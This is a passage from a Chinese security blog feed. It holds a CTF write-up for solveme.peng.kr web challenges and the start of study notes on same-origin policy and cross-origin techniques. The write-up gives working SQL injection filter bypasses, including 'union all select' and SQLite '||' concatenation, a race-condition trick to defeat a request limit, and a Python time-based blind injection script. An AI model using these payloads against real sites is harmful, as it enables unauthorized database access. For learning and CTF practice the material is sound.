$_GET[&apos;pw&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            &apos;/\.|\`|&quot;|\&apos;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&apos;.</span><br><span class="line">            &apos;=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|&apos;.</span><br><span class="line">            &apos;0x[0-9a-f]+|0b[01]+|x\&apos;[0-9a-f]+\&apos;|b\&apos;[01]+\&apos;|&apos;.</span><br><span class="line">            &apos;[\s\xA0\&apos;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&apos;&quot;]+|&apos;.</span><br><span class="line">            &apos;union[\s\xA0]+select|[\s\xA0](where|having)|&apos;.</span><br><span class="line">            &apos;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&apos;.</span><br><span class="line">            &apos;information_schema|procedure\s+analyse\s*/is&apos;,</span><br><span class="line">            $id.&apos;,&apos;.$pw</span><br><span class="line">        ) and die(&apos;Hack detected&apos;);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&apos;SQL server down&apos;);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                &quot;SELECT * FROM `antisqli` WHERE `id`=&apos;&#123;$id&#125;&apos; AND `pw`=md5(&apos;&#123;$pw&#125;&apos;);&quot;</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        if(isset($result))&#123;</span><br><span class="line">            if($result[&apos;no&apos;] === &apos;31337&apos;)&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;Hello, &apos;, $result[&apos;id&apos;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;Login failed&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>在正则里的第一行<code>|\\|</code>没有匹配到<code>\</code>,所以这个相当于完全没用, 匹配到<code>\</code>，需要<code>四个\</code>。因为<code>\</code>没有被过滤也给了我们逃逸单引号的条件, 只要<code>$_GET[&#39;id&#39;] = 1\</code>就可以逃逸出第一个单引号</p><p>在正则中的第二行<code>|#|--[\s\xA0]|</code> 过了用来注释的<code>#</code>和<code>--</code>这里的可以用<code>--</code>加一个不可见字符替代，例如:<code>%01 %11 %02</code>等</p><blockquote><p>直接尝试?id=1\&amp;pw=–%01 仍然显示login failed, 而这在本地测试中是可行的, 原因是本地测试中 id 被设置为INT, 而在题目中猜测 id  被设置为了VARCHAR, 于是考虑重新构造一个 union 查询</p></blockquote><p>正则中过滤了 union[\s\xA0]+select 但是可以直接用 union all select 来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 31337,31337,31337 from antisqli --%11</span><br></pre></td></tr></table></figure><h2 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        $name = $_GET[&apos;name&apos;];</span><br><span class="line">        if(preg_match(&quot;/admin|--|;|\(\)|\/\*|\\0/i&quot;, $name))&#123;</span><br><span class="line">            echo &apos;Not allowed input&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sql = new SQLite3(&apos;name_check.db&apos;, SQLITE3_OPEN_READWRITE);</span><br><span class="line">        $res = $sql-&gt;query(&quot;</span><br><span class="line">            SELECT </span><br><span class="line">            MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;, </span><br><span class="line">            INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0, </span><br><span class="line">            MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;, </span><br><span class="line">            SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;</span><br><span class="line">        ;&quot;);</span><br><span class="line">        if($res === false)&#123;</span><br><span class="line">            echo &apos;Database error&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">        if(</span><br><span class="line">            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||</span><br><span class="line">            array_sum($row) !== 4 </span><br><span class="line">        )&#123;</span><br><span class="line">            echo &apos;Auth failed&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag;</span><br><span class="line"></span><br><span class="line">    quit:</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>从上面代码中可以看出满足 <code>row[0] + $row[1] + $row[2] + $row[3] = 4</code> 就能输出flag。这个表达式的意思就是<code>sql</code>语句四个都为true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;, \\name的首字母为a</span><br><span class="line">INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0, \\name中有d</span><br><span class="line">MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;, \\name中间的字母为m</span><br><span class="line">SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;\\name以in结尾</span><br></pre></td></tr></table></figure><p>从上面的代码可以看出这里需要传入的<code>$name</code>的值就是<code>admin</code>，但是上面有正则过滤了<code>admin</code></p><p>sqlite的特性考虑查阅手册发现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite中，连接字符串不是使用+，而是使用||</span><br></pre></td></tr></table></figure></p><p>且<code>||</code>没有被过滤 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://namecheck.solveme.peng.kr/?name=adm&apos;||&apos;in</span><br></pre></td></tr></table></figure><h2 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // It&apos;s &apos;I am slowly&apos; problem of &apos;Solve Me&apos;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    $table = &apos;iamslowly_&apos;.ip2long($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    $answer = $_GET[&apos;answer&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&apos;SQL server down&apos;);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT `count` FROM `&#123;$table&#125;`;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(!isset($result))&#123;</span><br><span class="line">            mysqli_query($con, &quot;CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);&quot;);</span><br><span class="line">            $new_answer = md5(sha1(&apos;iamslowly_&apos;.mt_rand().&apos;_&apos;.mt_rand().&apos;_&apos;.mt_rand()));</span><br><span class="line">            mysqli_query($con, &quot;INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES (&apos;&#123;$new_answer&#125;&apos;,1);&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;elseif($result[&apos;count&apos;] === &apos;12&apos;)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</span><br><span class="line">            echo &apos;Game over&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(1, 10);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`=&apos;&#123;$answer&#125;&apos;;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(isset($result) &amp;&amp; $result[&apos;answer&apos;] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            mysqli_query($con, &quot;UPDATE `&#123;$table&#125;` SET `count`=`count`+1;&quot;);</span><br><span class="line">            echo &apos;Go fast&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>代码前面是连接MySQL数据库，并判断当前ip的信息是否存在，若不存在插入新的记录。</p><p>这里对<code>count</code>值进行判断，如果<code>count</code>的值等于12就把数据库中跟当前ip有关的表删除。</p><p><code>mysqli_query($con, &quot;SELECT * FROM</code>{$table}<code>WHERE sleep({$randtime}) OR</code>answer<code>=&#39;{$answer}&#39;;&quot;)</code></p><p>这里可以利用<code>answer</code>进行延迟盲注，但是如果我们请求的次数等于12时就会被删表。</p><p>所以我们需要绕过<code>count = 12</code>这一个判断,这里有个问题就是代码是先执行SQL语句查询，再执行<code>count++</code>。</p><p>所以可以在<code>count = 11</code>时加入<code>sleep(50)</code>一个比较长的延迟时间。这个时候立即再发一个请求。这个时候<code>count = 12</code>了,</p><p>等之前的<code>count = 11</code>的请求完成时，此时的<code>count = 13</code>了，这样就绕过了限制，可以无限的进行请求了。</p><p>至此我们就可以用写好的盲注脚本跑盲注了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer = &quot;&quot;</span><br><span class="line">for i in range(1, 33):</span><br><span class="line">    for j in &quot;abcdef1234567890&quot;:</span><br><span class="line">        url = &quot;http://iamslowly.thinkout.rf.gd/?answer=&apos; or if((answer like &apos;%s%%&apos;),sleep(30),1)%%23&quot; % (</span><br><span class="line">            answer + j)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url, timeout=29)</span><br><span class="line">            print(&quot;i:&quot;, i, &quot;j:&quot;, j, r.content[:10])</span><br><span class="line">        except:</span><br><span class="line">            answer += j</span><br><span class="line">            print(&quot;answer:&quot;, answer)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>提交answer,得到flag.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.freebuf.com/articles/web/165537.html" target="_blank" rel="noopener">Solveme.peng.kr平台Web题解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近自己的状态有点迷的，想学点代码审计的东西，又感觉自己的基础太菜。整个人昏昏沉沉的，偶尔逛freebuf看到一篇web题解的文章，&lt;/p&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>同源策略和跨域访问学习笔记</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://uknowsec.cn/posts/notes/同源策略和跨域访问学习笔记.html</id>
    <published>2018-03-29T07:13:01.000Z</published>
    <updated>2018-05-03T10:01:20.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h4><p>所谓同源是值三个相同</p><ul><li>协议相同</li><li>域名相同</li><li>端口相同</li></ul><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p><p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p><p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p><p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>只要协议、域名、端口有任何一个不同，都被当作是不同的域，跨域就是访问非本域的资源。</p><h3 id="跨域实现方式"><a href="#跨域实现方式" class="headerlink" title="跨域实现方式"></a>跨域实现方式</h3><ul><li>document.domain</li><li>window.name</li><li>window.postMessage</li><li>JSONP</li><li>iframe</li><li>CORS</li></ul><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie。</p><p>举例来说，A网页是<a href="http://w1.example.com/a.html" target="_blank" rel="noopener">http://w1.example.com/a.html</a> B网页是 <a href="http://w2.example.com/b.html" target="_blank" rel="noopener">http://w2.example.com/b.html</a> 那么只要设置相同的document.domain，两个网页就可以共享Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = &apos;example.com&apos;;</span><br></pre></td></tr></table></figure><p>现在，A网页通过脚本设置一个 Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;test1=hello&quot;;</span><br></pre></td></tr></table></figure><p>B网页就可以读到这个 Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allCookie = document.cookie;</span><br></pre></td></tr></table></figure><p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策。</p><p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如.example.com。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=value; domain=.example.com; path=/</span><br></pre></td></tr></table></figure><p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p><h4 id="实验-1-cookie-document-domain"><a href="#实验-1-cookie-document-domain" class="headerlink" title="实验 1 cookie document.domain"></a>实验 1 cookie document.domain</h4><p>w1.example.com/a.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var cookieName = &apos;Cookie&apos;;</span><br><span class="line">var cookieValue = &apos;Uknow&apos;;</span><br><span class="line">var myDate = new Date();</span><br><span class="line">myDate.setMonth(myDate.getMonth() + 12);</span><br><span class="line">document.cookie = cookieName +&quot;=&quot; + cookieValue + &quot;;expires=&quot; + myDate </span><br><span class="line">  + &quot;;domain=.example.com;path=/&quot;;</span><br><span class="line">alert(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>w2.example.com/b.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;example.com&apos;;</span><br><span class="line">alert(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在PHPstudy下配置虚拟主机 w1.example.com和w2.example.com，他们的html代码分别如上</p><p>访问 w2.example.com/b.html 看得到的cookie是否和 w1.example.com/a.html 一样</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-cookie.png" alt=""></p><p>由此可见document.domain可以实现cookie的跨域。</p><p>同样，两个网页不同源，就无法拿到对方的DOM。典型的例子是iframe窗口和window.open方法打开的窗口，它们与父窗口无法通信。</p><p>这里也可以通过document.domain来进行子域与父域之间的传值。</p><h4 id="实验-2-iframe-document-domain"><a href="#实验-2-iframe-document-domain" class="headerlink" title="实验 2 iframe document.domain"></a>实验 2 iframe document.domain</h4><p>父域 example.com/a.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;example.com&apos;;</span><br><span class="line">    var ifr = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    ifr.src = &apos;http://w2.example.com/b.html&apos;;</span><br><span class="line">    ifr.style.display = &apos;none&apos;;</span><br><span class="line">    document.body.appendChild(ifr);</span><br><span class="line">    ifr.onload = function()&#123;</span><br><span class="line">        var doc = ifr.contentDocument || ifr.contentWindow.document;</span><br><span class="line">        // 这里操作DOM</span><br><span class="line">        var oUl = doc.getElementById(&apos;ul1&apos;);</span><br><span class="line">        alert(oUl.innerHTML);</span><br><span class="line">        ifr.onload = null;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>子域 w2.example.com/b.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;example.com&apos;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;我是子域w2.example.com中的UL&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里可以看到我们在子域 w2.example.com/b.html中写了一个w2.example.com/b.html,写了一个UL标签。同时设置了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = &apos;example.com&apos;;</span><br></pre></td></tr></table></figure><p>然后在父域 example.com/a.html 定义一个iframe去读取子域的UL，实现异域的DOM读取。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-ifrome.png" alt=""></p><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p><p>在w2.example.com/b.html，该网页将信息写入window.name属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.name = data;</span><br></pre></td></tr></table></figure><p>接着，example.com/a.html跳回一个与它同域的网址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src = &quot;http://example.com/Proxy.html</span><br></pre></td></tr></table></figure><p>然后在example.com/a.html 读取w2.example.com/b.html的window.name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;iframe&quot;).contentWindow.name</span><br></pre></td></tr></table></figure><h4 id="实验-3-iframe-window-name"><a href="#实验-3-iframe-window-name" class="headerlink" title="实验 3 iframe window.name"></a>实验 3 iframe window.name</h4><p>example.com/a.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;example.com/a.html&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;example.com/a.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function test()&#123;</span><br><span class="line">        var obj = document.getElementById(&quot;iframe&quot;);</span><br><span class="line">        obj.onload = function()&#123;</span><br><span class="line">            var message = obj.contentWindow.name;</span><br><span class="line">            alert(message);</span><br><span class="line">        &#125;</span><br><span class="line">        obj.src = &quot;http://example.com/Proxy.html&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;http://w2.example.com/b.html&quot; onload=&quot;test()&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>w2.example.com/b.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;window.name&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;w2.example.com/b.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    //todo</span><br><span class="line">    window.name = &quot;This is message!&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>整个跨域的流程就是：</p><p>w2.example.com/b.html 设置了window.name = “This is message!”</p><p>而example.com/a.html想要获取到window.name的值就需要依靠iframe作为中间代理</p><p>首先把iframe的src设置成<a href="http://w2.example.com/b.html" target="_blank" rel="noopener">http://w2.example.com/b.html</a> 这样就相当于要获取iframe的window.name，</p><p>而要想获取到iframe中的window.name，就需要把iframe的src设置成当前域的一个页面地址”<a href="http://example.com/Proxy.html" target="_blank" rel="noopener">http://example.com/Proxy.html</a>“</p><p>不然根据前面讲的同源策略，window.name.html是不能访问到iframe里的window.name属性的。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-windowsname.png" alt=""></p><h3 